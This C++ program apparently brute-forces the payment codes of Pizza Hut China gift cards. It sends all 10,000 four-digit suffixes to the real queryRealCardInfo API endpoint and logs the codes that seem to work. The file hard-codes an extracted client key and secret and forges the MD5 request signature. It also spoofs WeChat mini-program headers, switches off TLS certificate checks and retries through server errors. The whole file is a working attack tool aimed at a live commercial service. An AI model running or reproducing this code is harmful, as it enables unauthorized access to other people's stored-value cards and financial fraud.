#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <time.h>
#include <fstream>
#include <map>
#include <algorithm>
#include <cctype>
#if defined(_WIN32)
#include <windows.h>
#pragma comment(lib,"win_lib/jsoncpp.lib")
#pragma comment(lib,"win_lib/libcurl.lib")
#pragma comment(lib,"win_lib/z.lib")
void print_localtime()
{
    time_t now = time(nullptr);
    struct tm tm_buf;
    localtime_s(&tm_buf, &now);
    char buf[64];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tm_buf);
    std::cout << buf << std::endl;
}
#define ph_sleep(sec) Sleep((sec) * 1000)
#endif
#if defined(__linux__) || defined(__linux) || defined(linux)
#include <unistd.h>
#define ph_sleep(sec) sleep(sec)
void print_localtime()
{
    time_t now = time(nullptr);
    struct tm* tm_buf = localtime(&now);
    char buf[64];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", tm_buf);
    std::cout << buf << std::endl;
}
#endif
#include "include/json/json.h"
#include "include/curl/curl.h"
#include "include/md5.h"

#define CLIENT_KEY "wxau5PW6sWIwx7nQ"
#define CLIENT_SEC "5opsk5ClazpBfq8B"
#define PATH "/card/queryRealCardInfo"
#define MAX_RETRY_CNT 500
#define ERR1 (res_body == "{\"errCode\":0}") //服务器"抽风"
#define ERR2 (res_body.find("{\"errCode\":\"4000099\"") == 0) //签名认证失败
#define ERR3 (res_body.find("{\"errCode\":\"500541\"") == 0)  //卡号或密码输入错误
#define ERR4 (res_body.find("{\"errCode\":\"400001\"") == 0) //您已在其他地方登录，或者登录信息过期，请重新登录
#define ERR5 (res_body.find("{\"errCode\":\"400000\"") == 0) //调用错误
#define ERR6 (res_body.find("{\"errCode\":\"50000001\"") == 0) //Internal Server Error
#define ERR7 (http_code != 200)

std::string token;
std::string cardSequence;
std::string paymentCode_prefix;
MD5 md5;
int retry_cnt;

std::map<std::string, std::string> headers =
{
    // host和content-length不要加,libcurl会自动加上
    {"rcsav", ""},
    {"kbsv", ""}, // 占位
    {"wechat-os-version", "Windows 10 x64"},
    {"xweb_xhr", "1"},
    {"wechat-language", "zh_CN"},
    {"wechat-version", "4.1.10.53"},
    {"kbck", CLIENT_KEY},
    {"accept", "*/*"},
    {"content-type", "application/json"},
    {"kbcts", ""}, // 占位
    {"cache-control", "no-cache"},
    {"wechat-platform", "windows"},
    {"rcsdcid", "rcsdcid"},
    {"wechat-pixelratio", "1.25"},
    {"user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2541a35) XWEB/20001"},
    {"wechat-model", "microsoft"},
    {"sec-fetch-site", "cross-site"},
    {"sec-fetch-mode", "cors"},
    {"sec-fetch-dest", "empty"},
    {"referer", "https://servicewechat.com/wx534b0be83d03a625/458/page-frame.html"},
    // curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "") 会自动加 accept-encoding
    {"accept-language", "zh-CN,zh;q=0.9"},
    {"priority", "u=1, i"},
};



//紧凑JSON
std::string json_compact_write(const Json::Value& root)
{
    Json::StreamWriterBuilder builder;
    builder["indentation"] = "";
    return Json::writeString(builder, root);
}


size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output)
{
    size_t total = size * nmemb;
    output->append((char*)contents, total);
    return total;
}

std::string curl_post(const std::string& url,
    const std::string& body,
    const std::map<std::string, std::string>& headers,
    long& http_code,
    int timeout_sec = 15)
{
    CURL* curl = curl_easy_init();
    if (!curl)
    {
        http_code = 0;
        return "";
    }

    std::string response;
    struct curl_slist* header_list = nullptr;

    for (const auto& h : headers)
    {
        std::string header_str = h.first + ": " + h.second;
        header_list = curl_slist_append(header_list, header_str.c_str());
    }

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout_sec);
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 0L);
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, ""); // 必须启用自动解压,否则卡密正确时返回的数据是乱码

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    else
    {
        std::cout << "curl error: " << curl_easy_strerror(res) << std::endl;
        http_code = 0;
        response.clear();
    }

    curl_easy_cleanup(curl);
    curl_slist_free_all(header_list);
    return response;
}

bool load_config()
{
    std::ifstream configFile("./config.json", std::ifstream::binary);
    if (!configFile.is_open()) {
        std::cerr << "无法打开配置文件,config.json必须在当前目录中" << std::endl;
        return false;
    }

    Json::Value root;
    Json::CharReaderBuilder readerBuilder;
    std::string errs;
    if (!Json::parseFromStream(readerBuilder, configFile, &root, &errs))
    {
        std::cerr << "配置文件解析失败: " << errs << std::endl;
        return false;
    }

    if (!root.isMember("token") || !root.isMember("cardSequence") || !root.isMember("paymentCodePrefix"))
    {
        std::cerr << "配置文件缺少必需字段" << std::endl;
        return false;
    }

    token = root["token"].asString();
    cardSequence = root["cardSequence"].asString();
    paymentCode_prefix = root["paymentCodePrefix"].asString();
    return true;
}

int main()
{
#if defined(_WIN32) || defined(_WIN64)
    SetConsoleOutputCP(65001);
#endif
    load_config();

    curl_global_init(CURL_GLOBAL_DEFAULT);
    const std::string url = "https://appmall.pizzahut.com.cn/api/card/queryRealCardInfo";
    Json::Value body;
    body["token"] = token;
    body["cardSequence"] = cardSequence;
    body["paymentCode"] = ""; // 占位，每次循环填充
    body["encodeList"] = Json::Value(Json::arrayValue);
    body["isFromCustomerClient"] = true;
    body["secretKey"] = "ph";

    for (int i = 0; i <= 9999; i++)
    {
        retry_cnt = 0;
    re_post:
        if (retry_cnt == MAX_RETRY_CNT + 1)
        {
            std::cout << "已经达最大重试次数,该卡号已经标记" << std::endl << std::endl;
            std::ofstream outfile("may_be_true_passwd.txt");
            if (outfile.is_open())
            {
                outfile << "[已经达最大重试次数] " << paymentCode_prefix << i << " [已经达最大重试次数]" << std::endl;
                outfile.close();
            }
            else
                std::cout << "打开may_be_true_passwd.txt失败! " << std::endl;

            continue;
        }

        auto str_i = std::to_string(i);
        auto zero_fill = std::string(4 - str_i.size(), '0');
        auto str_last_four_num = zero_fill + str_i;
        auto timestamp_str = std::to_string(std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());

        std::string paymentCode = paymentCode_prefix + str_last_four_num;
        body["paymentCode"] = paymentCode;
        std::string body_str = json_compact_write(body);
        std::string sign_source = std::string(CLIENT_KEY) + "\t" + CLIENT_SEC +
            "\t" + timestamp_str +
            "\t" + PATH +
            "\t\t" + body_str;
        std::string kbsv = md5(sign_source);
        headers["kbsv"] = kbsv;
        headers["kbcts"] = timestamp_str;

        print_localtime();
        std::cout << "尝试" << str_last_four_num << " ";
        if (retry_cnt)
            std::cout << "第" << retry_cnt << "次重试" << std::endl;

        long http_code = 0;
        std::string res_body = curl_post(url, body_str, headers, http_code, 15);

        if (!res_body.empty())
        {
            std::cout << "HTTP状态码:" << http_code << std::endl;
            std::cout << "响应体: " << res_body << std::endl << std::endl;

            if (ERR3)
            {
                ph_sleep(3);
                continue;
            }
            else if (ERR1 || ERR2 || ERR5 || ERR6 || ERR7)
            {
                retry_cnt++;
                ph_sleep(1);
                goto re_post;
            }
            if (ERR4)
            {
                std::cout << "致命错误: token失效,无法验证,进程退出..." << std::endl;
                break;
            }
            else
            {
                std::ofstream outfile("may_be_true_passwd.txt");
                if (outfile.is_open())
                {
                    outfile << "[疑似正确密码] " << paymentCode_prefix << i << " [疑似正确密码]" << std::endl;
                    outfile.close();
                }
                else
                    std::cout << "打开may_be_true_passwd.txt失败! " << std::endl;
            }
        }
        else
        {
            std::cout << "请求失败" << std::endl;
            if (res_body.empty())
            {
                std::cout << "错误描述: 无法读取res_body" << std::endl;
                std::cout << "系统错误: " << strerror(errno) << std::endl
                    << std::endl;
            }
            else
            {
                std::cout << "响应体: " << res_body << std::endl << std::endl;
            }
            retry_cnt++;
            ph_sleep(1);
            goto re_post;
        }
    }

    curl_global_cleanup();
    return 0;
}
